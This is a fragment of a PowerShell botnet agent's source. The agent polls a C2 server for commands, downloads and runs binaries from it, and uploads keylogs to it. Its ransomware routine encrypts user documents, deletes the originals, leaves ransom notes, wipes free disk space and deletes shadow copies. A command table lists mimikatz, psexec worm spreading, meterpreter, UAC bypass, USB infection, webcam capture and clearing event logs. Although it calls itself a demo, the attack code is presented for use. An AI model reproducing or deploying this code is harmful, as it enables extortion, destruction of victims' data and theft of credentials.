				del "$env:userprofile\dl.txt"
				del "$sdel"
			}
			#Cryptor
			[string] $cypher = $LatestOrder.split('|')[1]
			[string] $startfolder = $LatestOrder.split('|')[2]
			$downloadURL = "$c2c/pntdr/link/aes.txt"
            [string] $FileOnDisk =  "$env:userprofile\rec.txt"
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
			Invoke-Expression $downloadedScript
			[string]$hex = get-content -path $FileOnDisk
			[Byte[]] $temp = $hex -split ' '
			[System.IO.File]::WriteAllBytes("$env:userprofile\aex.exe", $temp)
			#attrib +h "$env:userprofile\aex.exe"
			#Deletor
			$downloadURL = "$c2c/pntdr/link/del.txt"
            [string] $FileOnDisk =  "$env:userprofile\dl.txt"
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
			[string]$hex = get-content -path $FileOnDisk
			[Byte[]] $temp = $hex -split ' '
			$sdel = (gi env:\userprofile).value
			$sdel = "$sdel\dl.exe"
			[System.IO.File]::WriteAllBytes("$sdel", $temp)
			#attrib +h $sdel
			[string[]] $exttocrypt = @()
			$message = "Hello, your files have been encrypted ! This is a ransomware demo. Send me bitcoin NOW !!!"
            $exttocrypt += 'doc','docx','xls','xlsx','ppt','pptx','jpg','png','bmp','pdf','txt','log','mp3','avi','mpeg','mp4'
			foreach ($ext in $exttocrypt) {ls $startfolder*.$ext -Recurse|foreach { $path = Resolve-Path $_.FullName ; $Command = "$env:userprofile\aex.exe -e -p $cypher $path";	[string] $CmdPath = "$env:windir\System32\cmd.exe";[string] $CmdString = "$CmdPath" + " /C " + "$Command"; Invoke-Expression $CmdString; del $path /F /S /Q; echo "$message" > "$path.txt"; ren "$path.txt" "ALERT.txt"}}		
			rd /s c:$Recycle.Bin
			$Shell = New-Object -ComObject Shell.Application;$RecycleBin = $Shell.Namespace(0xA);$RecycleBin.Items() | foreach{Remove-Item $_.Path -Recurse -Confirm:$false}
			$Command = "$sdel -p 2 -q -z C:";
			[string] $CmdPath = "$env:windir\System32\cmd.exe";[string] $CmdString = "$CmdPath" + " /C " + "$Command"; Invoke-Expression $CmdString; 
			$Command = "$sdel -p 2 -q -z D:";[string] $CmdPath = "$env:windir\System32\cmd.exe";[string] $CmdString = "$CmdPath" + " /C " + "$Command"; Invoke-Expression $CmdString;
			$Command = "$sdel -p 2 -q -z E:";[string] $CmdPath = "$env:windir\System32\cmd.exe";[string] $CmdString = "$CmdPath" + " /C " + "$Command"; Invoke-Expression $CmdString;
			vssadmin delete shadows /for=c: /all /quiet
			vssadmin delete shadows /for=D: /all /quiet
			vssadmin delete shadows /for=e: /all /quiet
			#assoc .exe=lolfile	
			$result = ls | findstr aes | Out-String
			sendC2 $pc $result $id
			}
		Function DecryptCommand { # !decrypt|Q4dsd87rn1AE5@54fDER4584S2dZFjjk559zrlb56skgv6e6IJNF9jgnnvcE54GFF|C:\users\
			[CmdletBinding()] param( 
			[string]$id
			)
			$exists = "$env:userprofile\aex.exe"
			If (Test-Path $exists){
				del "$env:userprofile\rec.txt"
				del "$env:userprofile\aex.exe"
			}
			#DeCryptor
			[string] $cypher = $LatestOrder.split('|')[1]
			[string] $startfolder = $LatestOrder.split('|')[2]
			$downloadURL = "$c2c/pntdr/link/aes.txt"
            [string] $FileOnDisk =  "$env:userprofile\rec.txt"
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
			[string]$hex = get-content -path $FileOnDisk
			[Byte[]] $temp = $hex -split ' '
			[System.IO.File]::WriteAllBytes("$env:userprofile\aex.exe", $temp)
			attrib +h "$env:userprofile\aex.exe"
			[string[]] $exttocrypt = @()
            $exttocrypt += 'doc','docx','xls','xlsx','ppt','pptx','jpg','png','bmp','pdf','txt','log','mp3','avi','mpeg','mp4'
			foreach ($ext in $exttocrypt) {ls $startfolder*.$ext -Recurse|foreach { $path = Resolve-Path $_.FullName ; $Command = "$env:userprofile\aex.exe -d -p $cypher $path";	[string] $CmdPath = "$env:windir\System32\cmd.exe";[string] $CmdString = "$CmdPath" + " /C " + "$Command"; Invoke-Expression $CmdString; del "ALERT.txt" /F /S /Q}}		
			rd /s c:$Recycle.Bin
			#assoc .exe=exefile		
			}			 
	# Bitcoin mining
		Function BitcoinMiningCommand {
			[CmdletBinding()] param( 
			[string]$id
			)
			# content
			$result = 'ok'
			sendC2 $pc $result $id
		}
	# Operations Control
		Function ChocoInstallCommand { # !choco  - install Choco and some usefull plug
			[CmdletBinding()] param( 
			[string]$id
			)
			$InstallDir="C:\ProgramData\choco"
			$env:chocolateyInstall=$InstallDir
			iex ((new-object net.webclient).DownloadString('https://chocolatey.org/install.txt'));
			$env:chocolateyUseWindowsCompression = 'true'
			SET PATH=%PATH%;C:\ProgramData\Choco\bin;
			$env:chocolateyUseWindowsCompression = 'true'
			[string] $result = Dir env:\ |findstr choco | Out-String
			sendC2 $pc $result $id
		}
		Function UpgradePShCommand { # !pshupgrade  --  upgrade powershell version
			[CmdletBinding()] param( 
			[string]$id
			)
			choco upgrade powershell -version 3.0.20120904 -y
			[string] $Global:pshversion = $PSVersionTable.psversion.Major
			$result = "PowerShell version: $pshversion"
			sendC2 $pc $result $id
		}	
		Function ChocoAptGetCommand { # !aptget|php OR !aptget|python2 OR !aptget|curl OR !aptget|wget - install package with linux style using CHOCOLATEY. You must first run !choco to be able to use it --> check chocolatey.org website for more commands
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $Package = $LatestOrder.split('|')[1]			
			choco install $Package -y
			$result = chocolatey list -localonly
			sendC2 $pc $result $id
				# install git to be able to use SSH
			# choco install git -params "/GitAndUnixToolsOnPath" -y
		} 
		Function SleepCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			$Global:sleeptime1 = $LatestOrder.split('|')[1]
			$Global:sleeptime2 = $LatestOrder.split('|')[2]
			$Global:sleeptime3 = $LatestOrder.split('|')[3]
            $result = 'ok'
			sendC2 $pc $result $id	 	
        }
		Function UpdateCommand {
		}		
			function RandomWait {
			   [string] $SecondsToWait = (Get-Random -InputObject $sleeptime1, $sleeptime2, $sleeptime3)
			   Write-Verbose "Sleep: $SecondsToWait sec"
			   Start-Sleep -Seconds $SecondsToWait
			}
        Function KillDateChecker {
            $DateCheck = (Get-Date) -lt (Get-Date $EndDate)
                if ($DateCheck -ne $True)  {
                    Write-Verbose "Kill date has passed. Exiting"
                    Exit
                }
        }           
        Function WorkHoursChecker {
            #Check to see if its between work hours
            $StartTimeCheck = (Get-Date) -ge (Get-Date $WorkStart)
            $EndTimeCheck = (Get-Date) -le (Get-Date $WorkEnd)    
                if (($StartTimeCheck -eq $True) -and ($EndTimeCheck -eq $True)) {
                    Write-Verbose "It is during work hours. Continuing"
					if (Test-Path "$env:userprofile\k.log") {CheckKeylog}
                }
                
                else {
                    Write-Verbose "Not during work hours. Restarting"
                    Invoke-Pnt
                }
        }
	    Function CheckKeylog {
            #Check to upload keylogs
            $StartTimeCheck = (Get-Date) -ge (Get-Date $keyupload)
            $EndTimeCheck = (Get-Date) -le (Get-Date $keyupload2)    
                if (($StartTimeCheck -eq $True) -and ($EndTimeCheck -eq $True)) {
                    Write-Verbose "Time to exfiltrate Keylogs "
					$date = Get-Date -Format MM/dd/yyyy-H:mm:ss
					ren $env:userprofile\k.log k-$date.log
					$result = "k-$date.log"			
					Exfiltrate $env:userprofile\k-$date.log
					sendC2 $pc $result $id 
                }
                
                else {
                    Write-Verbose "Not time to check keylog"
                }
        }
        Function CheckIPAddress {
            #Check to see if IP address is in allowed range
            Write-Verbose "The following IPs are allowed: $EngagementIPs"
             $HostIpAddresses = [Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() | % {$_.GetIPProperties()} | %{$_.UnicastAddresses} | % {$_.Address} | ? {$_.Address} | % {$_.IPAddressToString}
                [string[]] $CheckAnswer = @()
                
                foreach ($IpAddress in $HostIpAddresses) { 
                    $CheckAnswer += $EngagementIPs.Contains("$IpAddress")
                    Write-Verbose "Checking if $IpAddress is allowed"
                    Write-Verbose $CheckAnswer[-1]
                }
            
                if ($CheckAnswer -notcontains "True") {
                    Write-Verbose "No allowed IP address found. Checking external IP"
                    $ExternalIpAddress = $WebClientObject.downloadString('http://ifconfig.me/ip')
                    $CheckAnswer += $AllowedAddress.Contains("$ExternalIpAddress")
                    $WebClientObject.Dispose()
                }

                if ($CheckAnswer -notcontains "True") {
                    Write-Verbose "No allowed internal or external addresses found. Exiting"
                    Exit
                }
         
            Write-Verbose "Allowed IP address found. Continuing"
        }	
        Function Get-Latestcmd {
	# Check the C2 feed for new instructions
            [string] $CmdChannelAPIv1URL = "$c2c/pntdr/link/xml.php?pc=$pc"
            Write-Verbose "Checking latest command at:  $CmdChannelAPIv1URL"
			$XMLCmdChannelResult = New-Object System.Xml.XmlDocument
            $XMLCmdChannelResult.Load($CmdChannelAPIv1URL)
			[string[]] $LatestOrderArray = @()
			$XMLCmdChannelResult.statuses.status.text
			$XMLCmdChannelResult.statuses.status | Foreach { $LatestOrder = $_.text; $id = $_.id; 
			#Operate -LatestOrder $text -id $LatestOrderID			
			try {
			Write-Verbose "Random Wait ..."
            RandomWait
            Write-Verbose "Check Kill Date"
            KillDateChecker
            Write-Verbose "Check Work Hours"
            WorkHoursChecker         
            #Check to see if we are running with admin rights
            $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
            Write-Verbose "Are we running as admin? $IsAdmin"            
            #Check to see if a proxy is configured and if it is, use it
            $ProxyCheck = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyEnable
                if ($ProxyCheck -eq 1) {
                    Write-Verbose "Proxy configuration found, enabling proxy settings"
                    [string] $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
                    $WebProxyObject.Address = $ProxyAddress
                    $WebProxyObject.UseDefaultCredentials = $True
                    $WebClientObject.Proxy = $WebProxyObject
                }
            #Pull the user agent string from the registry
            [string] $UserAgent = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent'
            $WebClientObject.Headers.Add("user-agent", $UserAgent)              
            Write-Verbose "The latestOrder is $LastOrderFinal"
           # Write-Verbose "Comparing to {Get-Latestcmd}" 
			if (!$LatestOrder) { 
				HelloOnline 
				# Try to infect USB key in every execution
				if ($usbspreading -eq "on") { usbinfect $usbencoded }
				}
			else {
			[string] $BotCommand = $LatestOrder.split('|')[0]
			# Try to avoid loop in one command in case of error 
			if ($BotCommand -eq $LatestBotCommand){
				echo "latest true"
				$result = 'ERROR ! Agent has jump to avoid loop'
				sendC2 $pc $result $id
				}
			else {
            Write-Verbose "Evaluating command $BotCommand"
			Switch ($BotCommand) {
				!quit {QuitCommand $id}				  #  !quit   -     Delete all artifacts and clean computer. The end of operations
                !hello {HelloCommand $id}			  #  !hello
                !change {ChangeC2Command $id}			  #  !change|http:\newc2cserver.com
				!beef {BeefCommand $id}               #  !beef|iexplore.exe|http://192.168.3.40:3000/demos/basic.html   Param 2 can be: firefox.exe/ opera.exe/ chrome.exe/ iexplore.exe
                !speak {SpeakCommand $id}			  #  !speak|you have been, hacked.
				!recon {ReconCommand $id}             #  !recon
				!update {UpdateCommand $id}           #  !update --    Update c2c and every others usefull stuff
				!exfilfile {Exfil-FilesCommand $id}   #  !exfilfile|doc|C:\users\   Param 2 MUST ALWAYS END WITH "\" exple C:\users\           
				!zip {ZipCommand $id}                 #  !zip|C:\users\public\documents\|C:\users\secret.zip
                !exfiltrate {ExfiltrateCommand $id}   #  !exfiltrate|C:\users\secret.zip
				!outlook {Get-Outlook $id}  		  #  !outlook        - List all pst archives
				!run {RunCommand $id}				  #  !run|net localgroup adminstrators > c:\windows\temp\ad.txt
                !downexec {downexecCommand $id}		  #  !downexec|http://pastebinlikesite.com/moreevilpowershellscript.txt
                !download {downloadCommand $id}		  #  !download|http://tools.hackarmoury.com/general_tools/nc/nc.exe|c:\windows\temp\svchost.exe
                !video {VideoCommand $id}			  #  !video|http://www.youtube.com/watch?v=dQw4w9WgXcQ
                !meterpreter {MeterpreterShell $id}	  #  !meterpreter|10.0.0.23|443
                !gosleep {Sleepcommand $id}			  #  !gosleep|10|60|90
                !thunderstruck {ThunderstruckCommand $id} #  !thunderstruck|http://www.youtube.com/watch?v=v2AC41dglnM
                !eicar {EicarCommand $id}			  #  !eicar      -    Triggering AV alarm
                !scan {ScanCommand $id}   			  #  !scan       -    Network port scanning like with Nmap, all over the LAN
                !wcry {WannacryCheckCommand $id}      #  !wcry       -    Check system against WannaCry MS17-010 vulnerability
				!popup {PopupCommand $id}			  #  !popup|Administrative credentials are needed to install a pending update. You will be prompted shortly.|UPDATE PENDING
                !persist {PersistCommand $id}		  #  !persist|reg/ startup / task / wmi
                !elevate {ElevateCommand $id}		  #  !elevate|http://blahblah.com/fjdads/script.raw
				!privesc {GetSystemCommand $id}	      #  !privesc
				!migrate {MigrateCommand $id} 		  #  !migrate     - Inject shellcode into the process ID (default = explorer) of your choosing or within the context of the running PowerShell process.
				!ntlmspoof {InveighCommand $id}	  	  #  !ntlmspoof   - Use inveigh to peform Spoofing attack and capture various password (SMB, NTLM, HTTP, WPAD ...)
				!webinject {WebInjectCommand $id}	  #  !webinject   - Use interceptor.txt to inject html content in every web request 
				!hotpotatoes {HotPotatoes $id}        #  !hotpotatoes|net user tater Winter2016 /add && net localgroup administrators tater /add
				!adduser {AddUserCommand $id}         #  !adduser|johndoe|p@s5w0rd|domain   -  Add user in local admin group and domain admin group if specified
				!worm {WormCommand $id} 		  	  #  !worm    - download psexec, use credential and push bot in every ip in the LAN
#				!pth {PthCommand $id}                 #  !pth  Pass the hash
#				!wmilatmv {WmilatmvCommand $id}       #  !wmilatmv 
				!ngroktunnel {NgrokTunnelCommand $id} #  !ngroktunnel|authkey|http|80     - Expose zombie(TCP/IP) PC to Internet so that you can connect any tools
				!socks {SocksProxyCommand $id} 		  #	 !socks|1234 - Create a Socks 4/5 proxy on port 1234
				!portfwd {PortFwdCommand $id} 		  #  !portfwd|33389|127.0.0.1|3389 -- Create a simple tcp port forward. liste localy on 33389 and forward to local 3389			
				#!uaclevel {SetUACLevelCommand $id}   #  !uaclevel|on    ou   uaclevel|off
				!phpwebshell {PhpWebShell $id} 		  #  !phpwebshell  - download php et cmd.php, use credential and push bot in every ip in the LAN
				!psexec {PsexecCommand $id}    	  	  #  !psexec|domain\admin|password|192.168.3.202|powershell.exe 'calc.exe'    - download psexec, use credential and push bot in targeted ip 
                !infectmacro {InfectmacroCommand $id} #  !infectmacro|C:\Users
				!shellcode {InjectShellcode $id}      #  !shellcode|@(0x90,0x90,0xC3)   -  Inject the specifyed shellcode. msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 
				!usbspread {UsbspreadCommand $id}	  #  !usbspread|on     - Infect USB with malicious lnk
				!wallpaper {WallpaperCommand $id}	  #  !wallpaper|http://wallpapercave.com/wp/ky43p3I.jpg/|c:\windows\temp\1.jpg
				!webcam {WebcamCommand $id}           #  !webcam
                !packetcapture {PacketCaptureCommand $id} # !packetcapture|10
                !screenshot {ScreenshotCommand $id}   #  !screenshot
                !geolocate{GeolocateCommand $id}	  #	 !geolocate
				!geolocategps{GeolocateGPSCommand $id}#	 !geolocategps
				!BindShell {CmdBindShell $id}         #  !BindShell|8080  -  use it with !tunnel to expose localhost port 8080 over Internet
                !jsrat {JsRatShell $id} 	 		  #  !jsrat|192.168.10.96     # Handle connexion with: powershell.exe -Exe Bypass -File c:\test\JSRat.txt  & change listening IP ADDRESS in jsrat file
                !vnc {VncCommand $id}                 #  !vnc|bind||5900|pass1234   OR  §vnc|reverse|IP_of_attacker|5500|pass1234
				!rdp {RDPCommand $id}                 #	 !rdp|authkey
				!credential {CredentialCommand $id}   #  !credential
                !keylog {KeylogCommand $id} 		  #  !keylog
			   #!passdump {PassDumpCommand $id} 	  #  !passdump
				!remotemimikatz{MimikatzCommand $id}  #  !remotemimikatz
				!mimikatz{MimikatzCommand $id}		  #  !mimikatz
				!clearevent {ClearEventLog $id}       #	 !clearevent
				!logbypass {LogBypassCommand $id}     #	 !logbypass
				!extractlog {ExtractLogCommand $id}   #  !extractlog|system
				!macattrib {MacAttribCommand $id}  	  #  !macattrib|C:\secret.txt|01/03/2006 12:12 pm
				#!ddos {DdosCommand $id}              #  !ddos|http://target.com
				!encrypt {EncryptCommand $id}         #  !encrypt|Q4dsd87rn1AE5@54fDER4584S2dZFj|C:\users\      Param 2 MUST ALWAYS END WITH "\"    - encrypt all "doc,docx,xlx,xlsx,ppt,pptx,jpg,png,bmp,pdf,txt,log,mp3,avi,mpeg,mp4" files
				!decrypt {DecryptCommand $id}		  #  !decrypt|Q4dsd87rn1AE5@54fDER4584S2dZFj|C:\users\		Param 2 MUST ALWAYS END WITH "\"
				!bitcoin {BitcoinMiningCommand $id}   #  !bitcoin   # Bitcoin mining, enslave the bot ;-)
				!dnsspoof {DnsSpoofCommand $id}       #  !dnsspoof|127.0.0.1  facebook.com|0/1  --> 1 => add, 0 => clean & add
				#!destroy {DestroyCommand $id}        #  !destroy the system
				!sendmail {SendmailCommand $id}       #  !sendmail|target@corp.com|subject|Hello Im your friend|c:\evil.pdf    -  Send email from the compromised system
				!browserdump {BrowserDumpCommand $id} #  !browserdump
				#!backdoorlnk {BackdoorlnkCommand $id}#  !
				!bypassuac {BypassUacCommand $id}	  #  #!bypassuac|cmd   OR !bypassuac  - Bypass UAC and execute command in a privileged context.
				!sniff {SniffCommand $id}			  #  !sniff|
				}
			}
			[string] $LatestBotCommand = $BotCommand
			echo "latest cmd = $LatestBotCommand"
			}
       }
			catch {
            Write-Verbose "Error has occurred. Restarting  $Error[0]"
            Invoke-Pnt
        }
			finally {
            [int] $LastOrderFinal = [convert]::ToInt32($id, 10) 
        }      
			} 
            Write-Verbose "The Latest Command ID is:  $LatestOrderArray"		
        }
########################CONFIG DATA##################################            
    $ErrorActionPreference = 'SilentlyContinue'           
    [string] $EndDate = '2035-12-31'  
    #[bool] $IsAdmin = $False -+	
    [string] $WorkStart = '08:00'
    [string] $WorkEnd = '23:00'
	[string] $keyupload = '12:00'
	[string] $keyupload2 = '12:30'
#####################################################################                   
    $WebClientObject = New-Object System.Net.WebClient
    $WebProxyObject = New-Object System.Net.WebProxy
	[string] $CommandID
	Get-Latestcmd          
    [int] $Global:monitoring = 0
    [int] $Global:LastOrderFinal = 0
	Write-Verbose "MONITORING $monitoring"
    }
 	for (;;) {
        Invoke-drn -Verbose
		echo 'Activate sleep !'
		Start-Sleep -Seconds 10
		}
	}
## Create bot instance in C2C Server
Function InitializeBot {
	$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1] #
	$computerName = (gi env:\Computername).Value #
	$datebase = Get-Date -format D
	$dateString = Get-Date -format MM-dd-yyyy
	$date = Get-Date -Format MM/dd/yyyy-H:mm:ss
	$domain = (Get-WmiObject win32_computersystem).Domain
	$organisation = $domain
	# Computer
	$postParams = @{id=$pc;hostname=$computerName;ip=$ip;domain=$domain;org=$organisation;table='computer'}
	if ($pshversion -lt 3) {
		$Command = "$env:userprofile\AppData\cl.exe -X POST -F id=$pc -F hostname=$computerName -F ip=$ip -F domain=$domain -F org=$organisation -F table='computer' $c2c/pntdr/link/add.php"
		[string] $CmdPath = "$env:windir\System32\cmd.exe"
        [string] $CmdString = "$CmdPath" + " /C " + "$Command"
        Invoke-Expression $CmdString
		} else {
		Invoke-WebRequest -Uri "$c2c/pntdr/link/add.php" -Method POST -Body $postParams }
	}
## Curl for Communication with c2c if Powershell version is least than 3
Function Curl {
	[CmdletBinding()] param( 
		[string]$pc,
		[string]$result,
		[string]$id
		)
		$Command = "$env:userprofile\AppData\cl.exe -X POST -F pc=$pc -F result=$result -F id=$id $c2c/pntdr/link/ok.php"
		[string] $CmdPath = "$env:windir\System32\cmd.exe"
        [string] $CmdString = "$CmdPath" + " /C " + "$Command"
		echo "curl ok"
        Invoke-Expression $CmdString
	}
Function Curl_Add {
	[CmdletBinding()] param( 
		[string]$date,
		[string]$result,
		[string]$pc,
		[string]$table
		)
		$Command = "$env:userprofile\AppData\cl.exe -X POST -F date=$date -F data=$result -F pc=$pc  -F table=$table $c2c/pntdr/link/add.php"
		[string] $CmdPath = "$env:windir\System32\cmd.exe"
        [string] $CmdString = "$CmdPath" + " /C " + "$Command"
        Invoke-Expression $CmdString
	}
## Test if bot is already present on PC, if not it create instance of bot in C2 and regkey on the local system (zombie ID)
if (!(Test-Path "HKCU:\Software\$regkey")) {
	echo "no key"
	$pc= [System.Guid]::NewGuid().ToString()
	#TODO : Config.ini to modify the name of REG KEY used to persist
	REG ADD HKCU\Software\$regkey /v $regkey /t REG_SZ /d $pc /f
	InitializeBot	#Create bot instance in C2C Server
	$postParams = @{pc=$pc}
	if ($pshversion -lt 3) {
		$Command = "$env:userprofile\AppData\cl.exe -X POST -F pc=$pc $c2c/pntdr/link/hello.php"
		[string] $CmdPath = "$env:windir\System32\cmd.exe"
        [string] $CmdString = "$CmdPath" + " /C " + "$Command"
        Invoke-Expression $CmdString
		} else {
		Invoke-WebRequest -Uri "$c2c/pntdr/link/hello.php" -Method POST -Body $postParams
		}
	# Happy Botneting !
	Invoke-Pnt
} else {
	echo "key"
	$pc = (get-itemproperty -path HKCU:\Software\$regkey -name "$regkey").$regkey
}
echo "valueee $pc"
if (!(get-itemproperty -path HKCU:\Software\$regkey -name "$regkey").$regkey) { 
    echo "pc no value"
	$pc= [System.Guid]::NewGuid().ToString()
	REG ADD HKCU\Software\$regkey /v $regkey /t REG_SZ /d $pc /f
	InitializeBot	#Create bot instance in C2C Server
	$postParams = @{pc=$pc}
	if ($pshversion -lt 3) {
		$Command = "$env:userprofile\AppData\cl.exe -X POST -F pc=$pc $c2c/pntdr/link/hello.php"
		[string] $CmdPath = "$env:windir\System32\cmd.exe"
        [string] $CmdString = "$CmdPath" + " /C " + "$Command"
        Invoke-Expression $CmdString
		} else {
		Invoke-WebRequest -Uri "$c2c/pntdr/link/hello.php" -Method POST -Body $postParams
		}
	# Happy Botneting !
	Invoke-Pnt
 }
else {Invoke-Pnt}
